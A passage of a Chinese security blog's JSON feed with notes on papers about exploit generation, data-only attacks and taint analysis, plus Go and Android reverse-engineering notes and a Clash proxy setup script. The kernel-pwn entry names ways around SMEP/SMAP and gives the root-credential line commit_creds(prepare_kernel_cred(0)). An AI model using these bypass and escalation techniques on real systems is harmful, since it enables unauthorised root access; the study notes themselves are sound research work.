id=\"Statically-Discovering-High-Order-Taint-Style-Vulnerabilities-in-OS-Kernels\"><a href=\"#Statically-Discovering-High-Order-Taint-Style-Vulnerabilities-in-OS-Kernels\" class=\"headerlink\" title=\"Statically Discovering High-Order Taint Style Vulnerabilities in OS Kernels\"></a>Statically Discovering High-Order Taint Style Vulnerabilities in OS Kernels</h3><ul>\n<li>采用基于摘要的新型高阶污点流构建方法来有效地枚举交叉输入污点流</li>\n<li><a href=\"https://dl.acm.org/doi/pdf/10.1145/3460120.3484798\">3460120.3484798 (acm.org)</a></li>\n</ul>\n<h3 id=\"Learning-to-Explore-Paths-for-Symbolic-Execution\"><a href=\"#Learning-to-Explore-Paths-for-Symbolic-Execution\" class=\"headerlink\" title=\"Learning to Explore Paths for Symbolic Execution\"></a>Learning to Explore Paths for Symbolic Execution</h3><ul>\n<li>Learch，能够有效地选择有希望的状态进行符号执行，以解决路径爆炸问题</li>\n<li><a href=\"https://files.sri.inf.ethz.ch/website/papers/ccs21-learch.pdf\">ccs21-learch.pdf (ethz.ch)</a></li>\n</ul>\n<h3 id=\"Automated-Bug-Hunting-With-Data-Driven-Symbolic-Root-Cause-Analysis\"><a href=\"#Automated-Bug-Hunting-With-Data-Driven-Symbolic-Root-Cause-Analysis\" class=\"headerlink\" title=\"Automated Bug Hunting With Data-Driven Symbolic Root Cause Analysis\"></a>Automated Bug Hunting With Data-Driven Symbolic Root Cause Analysis</h3><ul>\n<li>基于执行轨迹的符号重构状态的漏洞挖掘方法，以更好地检测和分析用户程序及其导入库中的溢出、使用后释放、双重释放和格式化字符串漏洞的根本原因</li>\n<li><a href=\"https://dl.acm.org/doi/pdf/10.1145/3460120.3485363\">3460120.3485363 (acm.org)</a></li>\n</ul>\n<h2 id=\"Extra\"><a href=\"#Extra\" class=\"headerlink\" title=\"Extra\"></a>Extra</h2><h3 id=\"From-Release-to-Rebirth-Exploiting-Thanos-Objects-in-Linux-Kernel\"><a href=\"#From-Release-to-Rebirth-Exploiting-Thanos-Objects-in-Linux-Kernel\" class=\"headerlink\" title=\"From Release to Rebirth: Exploiting Thanos Objects in Linux Kernel\"></a>From Release to Rebirth: Exploiting Thanos Objects in Linux Kernel</h3><ul>\n<li>提出了一种多功能的利用策略，可以将弱利用原语转换为强利用原语</li>\n<li><a href=\"https://ieeexplore.ieee.org/stamp/stamp.jsp?tp=&amp;arnumber=9970376\">https://ieeexplore.ieee.org/stamp/stamp.jsp?tp=&amp;arnumber=9970376</a></li>\n</ul>\n<h3 id=\"Tetris-Automatic-UAF-Exploit-Generation-by-Manipulating-Layout-based-on-Reactivated-Paths\"><a href=\"#Tetris-Automatic-UAF-Exploit-Generation-by-Manipulating-Layout-based-on-Reactivated-Paths\" class=\"headerlink\" title=\"Tetris: Automatic UAF Exploit Generation by Manipulating Layout based on Reactivated Paths\"></a>Tetris: Automatic UAF Exploit Generation by Manipulating Layout based on Reactivated Paths</h3><ul>\n<li>一个自动生成用户空间 UAF 漏洞利用的系统，能够自动化构建需要的堆布局</li>\n<li><a href=\"https://ieeexplore.ieee.org/stamp/stamp.jsp?tp=&amp;arnumber=10053242\">https://ieeexplore.ieee.org/stamp/stamp.jsp?tp=&amp;arnumber=10053242</a></li>\n</ul>\n<h3 id=\"Detecting-Exploit-Primitives-Automatically-for-Heap-Vulnerabilities-on-Binary-Programs\"><a href=\"#Detecting-Exploit-Primitives-Automatically-for-Heap-Vulnerabilities-on-Binary-Programs\" class=\"headerlink\" title=\"Detecting Exploit Primitives Automatically for Heap Vulnerabilities on Binary Programs\"></a>Detecting Exploit Primitives Automatically for Heap Vulnerabilities on Binary Programs</h3><ul>\n<li>识别原语的新方法</li>\n<li><a href=\"https://ieeexplore.ieee.org/stamp/stamp.jsp?tp=&amp;arnumber=10053242\">https://ieeexplore.ieee.org/stamp/stamp.jsp?tp=&amp;arnumber=10053242</a></li>\n</ul>\n<hr>\n<p>- </p>\n",
            "tags": [
                "Paper"
            ]
        },
        {
            "id": "https://alazymechnaic.github.io/2023/08/21/aeg-reviwer/",
            "url": "https://alazymechnaic.github.io/2023/08/21/aeg-reviwer/",
            "title": "AEG_reviwer",
            "date_published": "2023-08-21T06:40:17.000Z",
            "content_html": "<h2 id=\"Detecting-Exploit-Primitives-Automatically-for-Heap-Vulnerabilities-on-Binary-Programs\"><a href=\"#Detecting-Exploit-Primitives-Automatically-for-Heap-Vulnerabilities-on-Binary-Programs\" class=\"headerlink\" title=\"Detecting Exploit Primitives Automatically for Heap Vulnerabilities on Binary Programs\"></a>Detecting Exploit Primitives Automatically for Heap Vulnerabilities on Binary Programs</h2><hr>\n<p>文章贡献：</p>\n<ul>\n<li>提出了primitive-crucialbehaviors analysis  ，该方法用于在符号执行过程中查找关键执行结构</li>\n<li>利用模糊测试和符号执行设计了一套攻击原语确定方法</li>\n<li>设计DEPA方法用于检测堆溢出相关原语</li>\n</ul>\n<p>文章提出了一种新的堆溢出漏洞原语的查找方法DEPA，基于以下两种技术：</p>\n<ul>\n<li>primitive-crucial-behavior analysis module <ul>\n<li>该模块对目标程序进行符号执行，在执行过程中进行primitive-crucial-behavior analysis（关键原语行为分析）</li>\n<li>primitive-crucial-behavior   ：实现原语的关键结构，此类结构往往与程序语义以及系统API有关<ul>\n<li>如何精准识别这些结构？</li>\n<li>如何利用该结构进行漏洞的发现？</li>\n</ul>\n</li>\n</ul>\n</li>\n<li>exploit primitive determination method  ：</li>\n</ul>\n<p><strong>事件循环驱动（event loop driven）</strong>：例如通过交互式进行功能分发的程序，此类程序在一次运行过程中接收一次输入，选择一种处理方式，而后结束。在对此类程序分析的过程中很难使用fuzzing或者符号执行的方法来探索程序的深层状态。</p>\n",
            "tags": [
                "paper"
            ]
        },
        {
            "id": "https://alazymechnaic.github.io/2023/07/20/go-yu-yan-reverse/",
            "url": "https://alazymechnaic.github.io/2023/07/20/go-yu-yan-reverse/",
            "title": "go语言-reverse",
            "date_published": "2023-07-20T11:50:06.000Z",
            "content_html": "<h2 id=\"GO-reverse\"><a href=\"#GO-reverse\" class=\"headerlink\" title=\"GO  reverse\"></a>GO  reverse</h2><hr>\n<h3 id=\"简介\"><a href=\"#简介\" class=\"headerlink\" title=\"简介\"></a>简介</h3><p>​\tGO语言是谷歌开发的强类型静态静态语言，其编译出的汇编代码与 C/ C++语言存在极大的差异。本身Go在编译过程中将所有的库函数和第三方包都进行了静态的打包操作，还打包进去了自身的runtime和（Garbage Collection， 垃圾回收）模块部分代码，导致其编译后的二进制文件体积十分庞大，存在较大的分析难度。</p>\n<h3 id=\"Go语言特性\"><a href=\"#Go语言特性\" class=\"headerlink\" title=\"Go语言特性\"></a>Go语言特性</h3><ul>\n<li><strong>独有的数据表示方式</strong>： 例如String类型使用，（start_address，length）二元组进行表示，导致其在进行函数调用时，传入的内容由原本C中的字符串地址变为了两个参数。</li>\n<li><strong>独有的栈管理机制</strong>：Go语言中的栈使用continue stack机制，每个runtime在初始状态下分配一个较小的区域当做栈，每次运行时如果栈不够用了就再申请一个更大的栈，将旧栈中的内容复制进去。</li>\n<li><strong>全静态链接</strong>：程序中并不按照函数名对库函数进行动态使用，而是进行全静态链接，在没有调试信息和符号表的情况下调试难度很大</li>\n<li><strong>独有的函数调用机制</strong>：Go语言函数中的callee的栈空间由caller来进行管理，caller在进入callee之前预先将栈中把参数留出，同时还要给返回值留出栈空间</li>\n</ul>\n<p><a href=\"https://www.anquanke.com/member.html?memberId=122079\">https://www.anquanke.com/member.html?memberId=122079</a></p>\n<p><a href=\"https://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&amp;mid=2458387116&amp;idx=1&amp;sn=c668daea30bc9dce8d79d316e93993e4&amp;chksm=b18f322686f8bb30e81b746446f08dcd381a588b5c0c6b842007cc822a875bd5ed14c2d74d6a&amp;scene=27\">https://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&amp;mid=2458387116&amp;idx=1&amp;sn=c668daea30bc9dce8d79d316e93993e4&amp;chksm=b18f322686f8bb30e81b746446f08dcd381a588b5c0c6b842007cc822a875bd5ed14c2d74d6a&amp;scene=27</a></p>\n<p><a href=\"http://leanote.com/blog/post/5c64bb2bab64415167000f48\">http://leanote.com/blog/post/5c64bb2bab64415167000f48</a></p>\n",
            "tags": [
                "go, RE"
            ]
        },
        {
            "id": "https://alazymechnaic.github.io/2023/07/20/an-zhuo-ji-chu/",
            "url": "https://alazymechnaic.github.io/2023/07/20/an-zhuo-ji-chu/",
            "title": "安卓基础",
            "date_published": "2023-07-20T11:07:47.000Z",
            "content_html": "<h2 id=\"本文用于介绍安卓基础架构以及安卓安全的学习方法及路线\"><a href=\"#本文用于介绍安卓基础架构以及安卓安全的学习方法及路线\" class=\"headerlink\" title=\"本文用于介绍安卓基础架构以及安卓安全的学习方法及路线\"></a>本文用于介绍安卓基础架构以及安卓安全的学习方法及路线</h2><ul>\n<li>采用课程与笔记相结合的方式</li>\n<li>移动安全课程<ul>\n<li><a href=\"https://www.bilibili.com/video/BV1nb411f777/?spm_id_from=333.337.search-card.all.click\">https://www.bilibili.com/video/BV1nb411f777/?spm_id_from=333.337.search-card.all.click</a></li>\n<li><a href=\"https://www.bilibili.com/video/BV1t3411u7cp/?spm_id_from=333.337.search-card.all.click\">https://www.bilibili.com/video/BV1t3411u7cp/?spm_id_from=333.337.search-card.all.click</a></li>\n</ul>\n</li>\n</ul>\n<h3 id=\"安卓程序的代码加载顺序\"><a href=\"#安卓程序的代码加载顺序\" class=\"headerlink\" title=\"安卓程序的代码加载顺序\"></a>安卓程序的代码加载顺序</h3><p><img src=\"https://alazymechnaic.oss-cn-hangzhou.aliyuncs.com/blog-page/image-20231122223143885.png\" alt=\"image-20231122223143885\"></p>\n<p>java层在使用native层函数时，首先要使用system.loadLibrary函数，最终调用dlopen去加载文件</p>\n<p>在加载成功后首先会加载.init函数和在.init_array列表中的函数，然后再进行程序主要逻辑的执行，这些函数中包含了对程序中的解密，解压缩等操作，应该重点关注。后面就是正常的start和main</p>\n<p>JNI_Onload对jni进行初始化，让native层执行java层的代码</p>\n<p><img src=\"https://alazymechnaic.oss-cn-hangzhou.aliyuncs.com/blog-page/image-20231122223818379.png\" alt=\"image-20231122223818379\"></p>\n",
            "tags": []
        },
        {
            "id": "https://alazymechnaic.github.io/2023/07/14/clash-build/",
            "url": "https://alazymechnaic.github.io/2023/07/14/clash-build/",
            "title": "clash_build",
            "date_published": "2023-07-14T02:14:42.000Z",
            "content_html": "<h2 id=\"Clash-Install\"><a href=\"#Clash-Install\" class=\"headerlink\" title=\"Clash Install\"></a>Clash Install</h2><hr>\n<figure class=\"highlight sh\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs sh\"><span class=\"hljs-comment\"># 下载clash</span><br>wget -O clash.gz https://github.com/Dreamacro/clash/releases/download/v1.13.0/clash-linux-amd64-v1.13.0.gz<br><span class=\"hljs-comment\"># 解压</span><br>gunzip -d clash.gz<br>sudo <span class=\"hljs-built_in\">chmod</span> +x clash<br>sudo <span class=\"hljs-built_in\">mkdir</span> /opt/clash<br>sudo <span class=\"hljs-built_in\">mv</span> clash /opt/clash<br><span class=\"hljs-built_in\">cd</span> /opt/clash<br><span class=\"hljs-comment\"># 下载配置文件</span><br>sudo wget https://github.com/Dreamacro/maxmind-geoip/releases/download/20230612/Country.mmdb<br><span class=\"hljs-comment\"># config.yaml中存放的是</span><br><span class=\"hljs-comment\"># 这里的配置文件需要clash的订阅文件，可以在客户端里找到</span><br><span class=\"hljs-built_in\">mv</span> /home/harry/1688348600374.yml ./config.yaml <br>./clash -f config.yaml<br><span class=\"hljs-comment\"># 保证clash后台运行</span><br><span class=\"hljs-built_in\">cp</span> Country.mmdb config.yaml ~/.config/clash<br><span class=\"hljs-built_in\">nohup</span> ./clash -f config.yaml &amp;<br>ps -ef | grep clash<br><br><span class=\"hljs-comment\"># 设置代理</span><br><span class=\"hljs-built_in\">export</span> http_proxy=http://127.0.0.1:7890 <br><span class=\"hljs-built_in\">export</span> https_proxy=http://127.0.0.1:7890<br><span class=\"hljs-comment\"># 里面编辑上述内容</span><br>sudo vim ~/.bashrc<br><span class=\"hljs-built_in\">source</span> ~/.bashrc<br><span class=\"hljs-comment\"># 如果想取消就是用下面命令</span><br><span class=\"hljs-built_in\">unset</span> http_proxy<br><span class=\"hljs-built_in\">unset</span> https_proxy<br> <span class=\"hljs-built_in\">export</span> PATH=$(<span class=\"hljs-built_in\">pwd</span>)/depot_tools:<span class=\"hljs-variable\">$PATH</span><br></code></pre></td></tr></tbody></table></figure>\n\n<h3 id=\"BUG\"><a href=\"#BUG\" class=\"headerlink\" title=\"BUG\"></a>BUG</h3><h4 id=\"重启后没有图形化界面\"><a href=\"#重启后没有图形化界面\" class=\"headerlink\" title=\"重启后没有图形化界面\"></a>重启后没有图形化界面</h4><figure class=\"highlight sh\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs sh\"><span class=\"hljs-comment\"># 重新安装图形化界面</span><br>sudo apt-get update<br>sudo apt-get install --reinstall ubuntu-desktop<br><span class=\"hljs-comment\"># 一般执行完上面一条就进去了</span><br>sudo apt-get install unity<br>sudo service lightdm resta<br></code></pre></td></tr></tbody></table></figure>\n\n<h4 id=\"建立python与python3之间的软连接\"><a href=\"#建立python与python3之间的软连接\" class=\"headerlink\" title=\"建立python与python3之间的软连接\"></a>建立python与python3之间的软连接</h4><figure class=\"highlight sh\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs sh\">sudo <span class=\"hljs-built_in\">ln</span> -s /usr/bin/python3 /usr/bin/python<br></code></pre></td></tr></tbody></table></figure>\n\n",
            "tags": [
                "clash"
            ]
        },
        {
            "id": "https://alazymechnaic.github.io/2023/07/13/kernel-pwn/",
            "url": "https://alazymechnaic.github.io/2023/07/13/kernel-pwn/",
            "title": "kernel_pwn",
            "date_published": "2023-07-13T12:41:24.000Z",
            "content_html": "<h2 id=\"Kernel-PWN\"><a href=\"#Kernel-PWN\" class=\"headerlink\" title=\"Kernel PWN\"></a>Kernel PWN</h2><hr>\n<p><img src=\"https://alazymechnaic.oss-cn-hangzhou.aliyuncs.com/blog-page/202309172016734.png\" alt=\"image-20230713204349079\"></p>\n<h3 id=\"内核保护技术\"><a href=\"#内核保护技术\" class=\"headerlink\" title=\"内核保护技术\"></a>内核保护技术</h3><ul>\n<li><p><strong>SMAP/SMEP</strong>: </p>\n<ul>\n<li><em>arm里面叫PXN(Privilege Execute Never)和PAN(Privileged Access Never)。</em><ul>\n<li>SMAP(Supervisor Mode Access Prevention，管理模式访问保护): 禁止内核访问用户空间数据</li>\n<li>SMEP(Supervisor Mode Execution Prevention，管理模式执行保护): 禁止内核访问用户代码区域</li>\n<li>使用cat /proc/cpuinfo指令查看当前程序中存在的SMAP/SMEP功能是否支持，<strong>win8之后开始支持SMEP，并且在RC4中设置适当的位来表示应该强制执行SMEP，可以通过ROP或者jmp到一个RWX的内核地址来绕过</strong>。linux内核从3.0开始支持SMEP，3.7开始支持SMAP。</li>\n</ul>\n</li>\n<li>ret2User: 在没有SMAP/SMEP保护的情况下将内核指针重定向到用户空间进行漏洞利用</li>\n<li>ret2dir:  physmap区域由内核管理并且由虚拟地址直接映射到物理地址。（也就时可以直接访问实际物理内存的内容）。在用户进行vmmap操作的时候，有很大概率能够将当前内存写入到该物理内存中，而内核又是可以直接访问该区域的，因此可以bypass SMAP/SMEP 参考文献： <a href=\"https://www.jianshu.com/p/3c662b6163a7\">https://www.jianshu.com/p/3c662b6163a7</a></li>\n</ul>\n</li>\n<li><p><strong>stack protector</strong>:  在编译内核时选择<em>CONFIG_CC_STACKPROTECTOR</em>选项开启该保护，功能类似canary</p>\n</li>\n<li><p><strong>Kernel Address Display Restrict</strong> ：限制内核地址显示，当攻击者试图开发通用性更强的漏洞利用程序时，他们通常需要知道内核结构的位置。 通过将内核地址视为敏感信息，常规本地用户无法看到那些地址。 从Ubuntu 11.04开始，/ proc / sys / kernel / kptr_restrict设置为“ 1”，以阻止报告已知的内核地址泄漏。 此外，只有root用户才能读取各种文件和目录：/boot/vmlinuz<em>、/boot/System.map</em>、/sys/kernel/debug/、/proc/slabinfo</p>\n</li>\n<li><h3 id=\"Kernel-Address-Space-Layout-Randomisation：\"><a href=\"#Kernel-Address-Space-Layout-Randomisation：\" class=\"headerlink\" title=\"Kernel Address Space Layout Randomisation：\"></a>Kernel Address Space Layout Randomisation：</h3><ul>\n<li>内存地址随机化，类似一般程序中的地址随机化，只不过是发生在内核</li>\n</ul>\n</li>\n</ul>\n<figure class=\"highlight c\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs c\">commit_creds(prepare_kernel_cred(<span class=\"hljs-number\">0</span>))<br><span class=\"hljs-comment\">// prepare_kernel_cred(0) 用0为参数生成一个root权限的结构体，并将其传递给commit_creds</span><br><span class=\"hljs-comment\">// commit_creds 用于将当前结构体设置为当前程序的凭证</span><br></code></pre></td></tr></tbody></table></figure>\n\n<h2 id=\"自问自答\"><a href=\"#自问自答\" class=\"headerlink\" title=\"自问自答\"></a>自问自答</h2><h3 id=\"为什么会产生僵尸进程（Zombie-Process）\"><a href=\"#为什么会产生僵尸进程（Zombie-Process）\" class=\"headerlink\" title=\"为什么会产生僵尸进程（Zombie Process）\"></a>为什么会产生僵尸进程（Zombie Process）</h3><p>僵尸进程指已经完成了执行任务的子进程，但是由于其父进程没有及时处理该子进程的完成状态，该子进程的进程控制块PCB仍然被保留在系统中，占用了系统资源，但是无法被调用和执行任何任务，也无法被清除。僵尸进程会一直存在，直到父进程执行结束，或者对子进程进行处理wait或者waitpid。</p>\n<h3 id=\"内核如何实现对进程资源的回收\"><a href=\"#内核如何实现对进程资源的回收\" class=\"headerlink\" title=\"内核如何实现对进程资源的回收\"></a>内核如何实现对进程资源的回收</h3><p>程序退出一般有以下几种情况：</p>\n<p>exit()函数退出，也是正常退出。</p>\n<p>quick_exit函数: 执行部分清理工作后再退出</p>\n<p> _Exit()函数：立即终止程序而不进行任何的清理工作。</p>\n<p>信号退出：</p>\n<ul>\n<li>SIGINT：中断信号。通常由用户按下 Ctrl+C 产生。</li>\n<li>SIGTERM：终止信号。通常由 kill 命令发出，表示要求进程正常退出。</li>\n<li>SIGQUIT：退出信号。通常由用户按下 Ctrl+\\ 产生，表示要求进程退出并生成核心转储文件。</li>\n<li>SIGKILL：强制终止信号。通常由 kill 命令发出，表示要求进程立即退出，无法被捕获或阻塞。</li>\n<li>SIGABRT：异常中止信号。通常由进程本身发出，表示要求进程退出并生成核心转储文件。</li>\n</ul>\n<p>与exit不同，接收信号退出时一般不会执行完整的清理工作，比如刷新I/O缓冲区、关闭文件描述符等，在编写信号处理函数时需要手动执行该操作。</p>\n<p>当程序执行exit函数时，操作系统会完成以下几个操作：</p>\n<ul>\n<li>调用atexi()注册的终止函数。这些函数通常用于在程序结束时执行特定的清理任务。</li>\n<li>刷新所有的I/O缓冲区，以确保所有的数据被写入到文件中</li>\n<li>关闭所有打开的文件描述符</li>\n<li>释放所有的动态分配内存</li>\n<li>操作系统向父进程发送一个 SIGCHLD 信号，将程序的退出状态（成功退出还是异常退出）返还给父进程或者操作系统</li>\n<li>父进程通过调用诸如 wait() 或 waitpid() 等函数来回收子进程的资源：以获取子进程的退出状态码和回收子进程的进程表项</li>\n<li>父进程回收子进程的进程表项：子进程结束后，父进程需要回收子进程的进程表项，以便其他进程可以使用该进程号</li>\n</ul>\n<h2 id=\"参考链接\"><a href=\"#参考链接\" class=\"headerlink\" title=\"参考链接\"></a>参考链接</h2><p><a href=\"https://bbs.kanxue.com/thread-262425.htm\">https://bbs.kanxue.com/thread-262425.htm</a></p>\n",
            "tags": [
                "kernel pwn"
            ]
        },
        {
            "id": "https://alazymechnaic.github.io/2023/07/04/lun-wen-yue-du-bi-ji-bopc-data-only-attack/",
            "url": "https://alazymechnaic.github.io/2023/07/04/lun-wen-yue-du-bi-ji-bopc-data-only-attack/",
            "title": "论文阅读笔记：BOPC-Data-Only-Attack",
            "date_published": "2023-07-04T09:09:42.000Z",
            "content_html": "<h2 id=\"Block-Oriented-Programming-Automating-Data-Only-Attacks\"><a href=\"#Block-Oriented-Programming-Automating-Data-Only-Attacks\" class=\"headerlink\" title=\"Block Oriented Programming: Automating Data-Only Attacks\"></a>Block Oriented Programming: Automating Data-Only Attacks</h2><hr>\n<p>目的： 能够依照代码块组指出包含特定语义的结构。构造出了一种自己的语言SPL，生成SPL payload来组织成特定的语义。</p>\n<p>前提： 一个任意内存写原语（能够向任意位置中写入任意值），一个任意内存读原语（可选），以及执行完上述两个原语后自然到达的位置。（其实本质上来讲改文章的贡献在于如何充分利用给一个AWP(任意内存写原语)</p>\n<p>流程：</p>\n<ul>\n<li>BOPC提供了一个面向exploit编程的语言SPL，使分析人员能够定义一个独立于目标问题和底层架构的exploit</li>\n<li>在目标程序中搜索相应的功能块作为基本块</li>\n<li>搜索Dispatcher块用于将各个功能块链接在一起</li>\n<li>依照AWP构造出相应的BOP链的payload</li>\n</ul>\n<p>关键技术：</p>\n<p><strong>Block Oriented Programming</strong>：</p>\n<ul>\n<li>BOP链由表示一条SPL语义的BOP gadget和链接这些BOP gadget的DIspatcher组成</li>\n<li>将每个基本块抽象为块约束摘要便于与SPL语言的一一对应。但是由于进入该块的时候上下文的不同，每一个块可能会表现出不同的功能（这里怎么进行抽象的？</li>\n<li>构造BOP链本身是NP难的问题</li>\n</ul>\n<p><strong>Block Constraint Summaries</strong>：  </p>\n<p>​\t将程序的输入映射到程序执行路径是NP难的问题，<strong>使用启发式的方法帮助查找路径中所有可能的路径</strong>。</p>\n<ul>\n<li><p>对单个块做符号执行，收集约束，做出输入与输出之间的映射关系。</p>\n</li>\n<li><p>要查找块和SPL语句之间的匹配，块必须执行该SPL语句所需的所有操作。</p>\n</li>\n<li><p>BOPC依照语义计算一组候选功能块和相应的分发器，但是很可能选出的几个gadget之间并不存在合法的路径，或者符合CFI的路径</p>\n</li>\n<li><p>BOP gadget依照选取的块不同，其本身也是不稳定的，前面的gadget很可能会改变后面gadget的性质，同时不断增加gadget也会增加当前路径的约束</p>\n</li>\n</ul>\n<p><strong>解决方案</strong>：BOPC使用当前程序的BOP块的接近度用于评分排序，以及delta图来组织BOP gadget序列</p>\n<ul>\n<li><strong>BOP块接近度</strong>：</li>\n<li><strong>delta图</strong>：用于表示当前搜寻分发器block的状态。<ul>\n<li>存储每一个功能块到下一个候选块之前的最短路径</li>\n<li>任意拼接两个块之间的路径本身是一个NP难的问题</li>\n<li>功能块之间的选择依据是，更短的路径可能会导致更合适的约束</li>\n<li>delta图中记录了每一个功能块，功能块的边是两个功能块之间转移需要经过的block数量.（但是在计算两个block之间的路径时，静态CFG上是可以有多个重点，但在实际执行时只会有一个终点。其实就是对控制流进行枚举的过程，你怎么知道实际路径是哪些的</li>\n<li>文章提出的路径算法是迪杰斯特拉算法的递归版本，并且避免了所有的破坏块。<ul>\n<li>迪杰斯特拉算法：不断加入新的结点作为中间跳转结点，计算出最短距离</li>\n<li>算法逻辑：初始分析时将相邻的边的开销设置为1。当其遇到call指令时，就进行递归地计算，找到每个功能块之间的最短路径</li>\n</ul>\n</li>\n</ul>\n</li>\n<li>BOP gadget缝合：<ul>\n<li>从每一个BOPgadget开始不断向后进行符号执行读入新的BOP功能块，直到最后一个块。</li>\n</ul>\n</li>\n</ul>\n<p>在进行组织的过程中需要在BOP gadget间拼接不会影响当前程序执行流的基本块。使用delta 图来搜索当前所有的调度块。</p>\n",
            "tags": [
                "paper"
            ]
        },
        {
            "id": "https://alazymechnaic.github.io/2023/06/27/lun-wen-yue-du-bi-ji-viper-ssgvdoa/",
            "url": "https://alazymechnaic.github.io/2023/06/27/lun-wen-yue-du-bi-ji-viper-ssgvdoa/",
            "title": "论文阅读笔记：VIPER-SSGVDOA",
            "date_published": "2023-06-27T01:50:02.000Z",
            "content_html": "<h2 id=\"VIPER-Spotting-Syscall-Guard-Variables-for-Data-Only-Attacks\"><a href=\"#VIPER-Spotting-Syscall-Guard-Variables-for-Data-Only-Attacks\" class=\"headerlink\" title=\"VIPER: Spotting Syscall-Guard Variables for Data-Only Attacks\"></a>VIPER: Spotting Syscall-Guard Variables for Data-Only Attacks</h2><hr>\n<h3 id=\"摘要\"><a href=\"#摘要\" class=\"headerlink\" title=\"摘要\"></a>摘要</h3><ul>\n<li>文章的主要目的是检查那些影响数据流，促使程序运行至关键系统调用的关键变量。VIPER能够自动化地查找实现对系统调用保护分支和变量的自动和可扩展检测</li>\n<li>两个关键定义：Syscall-Guard Variables，syscallguard变量决定是否调用与安全相关的系统调用 ，因此它们的值对程序安全性有直接影响。这意味着它们应该被视为关键数据。同样也衍生出，syscall-Guard branch，用于决定是否会执行当前的系统调用。</li>\n<li>一个关键方法： 文章提出了分支强制（branch force），它有意地翻转执行过程中的每个条件分支，并检查是否调用了新的与安全相关的syscalls。如果是，则进行数据流分析以估计通过常见内存错误翻转这些分支的可行性。</li>\n<li>基本逻辑：程序想要通过数据流攻击实现一定的攻击语义，必须要依赖于一定的系统调用实现。然而系统调用在处理不受信任的输入前一定会存在一定的检查操作。</li>\n</ul>\n<h3 id=\"识别困难\"><a href=\"#识别困难\" class=\"headerlink\" title=\"识别困难\"></a>识别困难</h3><p>​\t关键变量可能会以任何数据类型，任何存储位置存在。这会导致传统的分析方式失效。况且对于大型程序，进行变量的推断是十分困难的。</p>\n<h3 id=\"攻击的前提\"><a href=\"#攻击的前提\" class=\"headerlink\" title=\"攻击的前提\"></a>攻击的前提</h3><ul>\n<li>不管程序是什么，大多数纯数据攻击都依赖于与安全相关的系统 调用(简称系统调用)来实现最终目标。（其实就是最终的攻击语义一定要依赖于系统调用的存在）</li>\n<li>关键的系统调用函数前一定会存在一些分支检查</li>\n</ul>\n<h3 id=\"技术方案\"><a href=\"#技术方案\" class=\"headerlink\" title=\"技术方案\"></a>技术方案</h3><ul>\n<li>使用相同的输入进入程序，找到分支，进行强制跳转。如果强制跳转之后触发了程序的bug，那么该分支就作为候选分支</li>\n<li>在一次执行中翻转分支条件，找到新的分支条件生成新的路径，查找新的系统调用</li>\n</ul>\n<h3 id=\"challenge\"><a href=\"#challenge\" class=\"headerlink\" title=\"challenge\"></a>challenge</h3><ul>\n<li>修剪掉无用的分支，并且评估单个变量的影响是十分有挑战性的。符号执行能够找到从程序入口到关键系统调用的路径，但是并不能给出，当前路径上的哪些分支是更重要的，因此只能对所有的分支都做分析</li>\n<li>找到一种高效的分析方法很困难，使用间接函数调用的程序太多了，使用静态分析十分不切实际</li>\n</ul>\n<h3 id=\"approaches\"><a href=\"#approaches\" class=\"headerlink\" title=\"approaches\"></a>approaches</h3><ul>\n<li><strong>branch force</strong>：收集候选的分支变量<ul>\n<li>思想：假设当前分支时关键保护分支，那么该分支向后执行仅仅只能有其中一个分支触发当前程序中的系统调用，如果两个都能触发，那这个分支肯定不是关键保护分支。如果都不能触发，则该分支对于当前程序的安全性并不重要。</li>\n<li>执行流程：<ul>\n<li>以相同的输入I执行程序，将遇到的每一个分支进行强制翻转（并不改变输入），并且</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n<p><img src=\"https://alazymechnaic.oss-cn-hangzhou.aliyuncs.com/blog-page/202309172016500.png\" alt=\"image-20230628155213365\"></p>\n<ul>\n<li><strong>dynamic backward data-flow</strong>：检查每个变量被覆盖利用的可能性</li>\n<li><strong>Corruptibility Assessment</strong> ： 使用数据流来评估每一个分支变量被内存错误污染的可能性。同时使用动态数据流分析，在过程中根据变量的存储位置和内存的声明周期对内存进行定性，分别视为容易利用和难利用三种等级。全局变量相对局部变量更容易被利用，生命周期越长，被修改次数越多，能被利用的概率越高。依此能够筛选出被破坏概率更高的关键变量。</li>\n</ul>\n<h3 id=\"整体流程\"><a href=\"#整体流程\" class=\"headerlink\" title=\"整体流程\"></a>整体流程</h3><p><img src=\"https://alazymechnaic.oss-cn-hangzhou.aliyuncs.com/blog-page/202309172016755.png\" 